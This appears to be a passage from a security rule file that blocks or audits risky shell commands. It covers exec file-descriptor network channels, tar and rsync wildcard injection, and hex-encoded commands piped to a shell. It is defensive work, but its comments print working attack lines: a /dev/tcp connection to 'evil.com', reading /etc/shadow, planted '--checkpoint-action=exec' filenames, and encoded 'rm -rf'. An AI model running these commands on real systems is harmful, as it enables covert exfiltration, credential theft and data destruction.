  # =========================================================================
  # exec File Descriptor Hijacking & Shell Replacement
  # =========================================================================
  #
  # The bash `exec` builtin has two dangerous modes:
  #
  # 1. FD redirection: exec N<>/dev/tcp/HOST/PORT
  #    Opens a network connection as a file descriptor WITHOUT any external
  #    tool (no curl, no wget, no nc). Completely invisible to tool-based
  #    network detection:
  #      exec 3<>/dev/tcp/evil.com/80
  #      echo -e "GET /cmd HTTP/1.1\r\nHost: evil.com\r\n\r\n" >&3
  #      cat <&3
  #    This creates a full bidirectional network channel using only bash
  #    builtins. No external binary is invoked, so process-based monitoring
  #    sees nothing.
  #
  # 2. Shell replacement: exec bash --norc --noprofile
  #    Replaces the current shell with a new one that skips all init files.
  #    This bypasses:
  #      - .bashrc hooks (where monitoring may be installed)
  #      - .bash_profile security controls
  #      - PROMPT_COMMAND monitoring
  #      - Any shell-level security wrappers
  #    The PID stays the same, so ps output looks normal.
  #
  # 3. FD redirect to sensitive files:
  #      exec 3< /etc/shadow
  #      cat <&3
  #    Opens sensitive files via FD for later reading, potentially bypassing
  #    path-based access controls that only check the initial command.
  #
  # Taxonomy: persistence-evasion/covert-channels/exec-fd-hijack
  # OWASP LLM06 (Excessive Agency)
  # MITRE T1059.004 — Unix Shell (tool-less networking)
  # MITRE T1071.001 — Application Layer Protocol (covert channel)
  # MITRE T1562.001 — Impair Defenses: Disable or Modify Tools
  # CWE-78 — OS Command Injection
  # =========================================================================

  # --- BLOCK: exec fd redirect to /dev/tcp or /dev/udp ---
  - id: "ts-block-exec-fd-network"
    taxonomy: "persistence-evasion/covert-channels/exec-fd-hijack"
    match:
      command_regex: "exec\\s+\\d+\\s*<>\\s*/dev/(tcp|udp)/"
    decision: "BLOCK"
    confidence: 0.97
    reason: "exec with fd redirect to /dev/tcp or /dev/udp — opens a network connection using only bash builtins with zero external tools. Invisible to process-based network monitoring. Creates a bidirectional channel for C2 or exfiltration. MITRE T1059.004."

  # --- BLOCK: exec shell replacement with --norc/--noprofile ---
  - id: "ts-block-exec-shell-norc"
    taxonomy: "persistence-evasion/covert-channels/exec-fd-hijack"
    match:
      command_regex: "exec\\s+(bash|sh|zsh|dash|ksh)\\s+.*(--norc|--noprofile|-f)"
    decision: "BLOCK"
    confidence: 0.93
    reason: "exec replacing the current shell with one that skips init files — bypasses .bashrc hooks, PROMPT_COMMAND monitoring, and shell-level security wrappers while keeping the same PID (invisible in ps). MITRE T1562.001."

  # --- BLOCK: exec fd redirect to credential/sensitive files ---
  - id: "ts-block-exec-fd-credential"
    taxonomy: "persistence-evasion/covert-channels/exec-fd-hijack"
    match:
      command_regex: "exec\\s+\\d+\\s*<\\s*(~|\\$HOME|/home/|/root/|/etc/)(\\S*)?(shadow|passwd|sudoers|ssh|aws|gnupg|kube|config|credentials|token|secret|key|id_rsa|id_ed25519)"
    decision: "BLOCK"
    confidence: 0.92
    reason: "exec opening a credential or sensitive file via file descriptor — reads sensitive data through an FD handle that may bypass path-based monitoring. The FD persists for later reads via cat <&N. CWE-200."

  # --- AUDIT: exec with fd redirect to any file ---
  - id: "ts-audit-exec-fd-redirect"
    taxonomy: "persistence-evasion/covert-channels/exec-fd-hijack"
    match:
      command_regex: "exec\\s+\\d+\\s*[<>]"
    decision: "AUDIT"
    confidence: 0.75
    reason: "exec with numeric file descriptor redirect — may be used for covert channels, sensitive file access, or network connections via /dev/tcp. Auditing for review."

  # ==========================================================================
  # Wildcard Injection via Filename-to-Flag Expansion
  # ==========================================================================
  #
  # Unix glob expansion (*) happens BEFORE the target command parses its args.
  # An attacker creates files whose names look like command-line flags:
  #
  #   touch -- '--checkpoint=1' '--checkpoint-action=exec=sh payload.sh'
  #   tar cf archive.tar *          ← glob expands filenames into tar flags
  #
  # tar's --checkpoint-action=exec= flag runs an arbitrary command at each
  # checkpoint. rsync's -e flag specifies a remote shell command. Both are
  # well-known CTF/pentest techniques (HackTricks, Vulnhub) but are rarely
  # caught by runtime security tools because the tar/rsync command itself
  # looks completely benign — only the file-creation step reveals the intent.
  #
  # We detect the PLANTING step (touch/echo creating flag-shaped filenames)
  # rather than the execution step, because the execution is indistinguishable
  # from a normal tar/rsync invocation.
  #
  # CWE-88 (Improper Neutralization of Argument Delimiters),
  # MITRE T1059.004, T1036.

  # --- BLOCK: tar checkpoint-action wildcard injection (touch/echo planting) ---
  - id: "ts-block-wildcard-inject-checkpoint"
    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
    match:
      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*--checkpoint-action"
    decision: "BLOCK"
    confidence: 0.95
    reason: "Creating a file named '--checkpoint-action=...' — tar wildcard injection. When tar operates on *, glob expansion turns this filename into a flag that executes arbitrary commands at each checkpoint. CWE-88, MITRE T1059.004."

  # --- BLOCK: tar checkpoint marker file (companion to checkpoint-action) ---
  - id: "ts-block-wildcard-inject-checkpoint-marker"
    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
    match:
      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*--checkpoint="
    decision: "BLOCK"
    confidence: 0.93
    reason: "Creating a file named '--checkpoint=N' — tar wildcard injection marker. Used alongside --checkpoint-action to trigger command execution during tar operations. CWE-88."

  # --- BLOCK: rsync -e shell wildcard injection ---
  - id: "ts-block-wildcard-inject-rsync-shell"
    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
    match:
      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*-e\\s+sh\\b"
    decision: "BLOCK"
    confidence: 0.90
    reason: "Creating a file named '-e sh ...' — rsync wildcard injection. When rsync operates on *, this filename becomes the -e flag specifying a remote shell command. CWE-88."

  # --- BLOCK: --reference= wildcard injection for chown/chmod ---
  - id: "ts-block-wildcard-inject-reference"
    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
    match:
      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*--reference=/(etc/(shadow|passwd|sudoers)|root/)"
    decision: "BLOCK"
    confidence: 0.92
    reason: "Creating a file named '--reference=/etc/shadow' — chown/chmod wildcard injection. Glob expansion turns this into a flag that copies permissions from a privileged file. CWE-88."

  # ==========================================================================
  # printf/echo Hex Command Construction → Shell Execution
  # ==========================================================================
  #
  # ANSI-C quoting detection ($'\xNN') does NOT catch printf-based hex encoding:
  #
  #   printf '\x72\x6d\x20\x2d\x72\x66' | sh     ← "rm -rf" decoded and executed
  #   eval "$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')"
  #   echo -e '\x63\x75\x72\x6c' | bash
  #
  # printf with hex escapes piped to a shell or wrapped in eval/command-substitution
  # is functionally equivalent to ANSI-C evasion but uses a completely different
  # syntax path. This is a significant detection gap.
  #
  # MITRE T1027.004 (Obfuscated Files or Information: Compile After Delivery),
  # CWE-78, CWE-116.

  # --- BLOCK: printf with hex escapes piped to shell interpreter ---
  - id: "ts-block-printf-hex-pipe-shell"
    taxonomy: "unauthorized-execution/remote-code-exec/printf-command-construction"
    match:
      command_regex: "printf\\s+['\"].*\\\\x[0-9a-fA-F]{2}.*['\"]\\s*\\|\\s*(sh|bash|zsh|dash|ksh|fish)"
    decision: "BLOCK"
    confidence: 0.95
    reason: "printf with hex escape sequences piped to a shell interpreter — constructs and executes encoded commands, evading ANSI-C quoting detection. MITRE T1027.004."

  # --- BLOCK: echo -e with hex escapes piped to shell interpreter ---
  - id: "ts-block-echo-hex-pipe-shell"
    taxonomy: "unauthorized-execution/remote-code-exec/printf-command-construction"
    match:
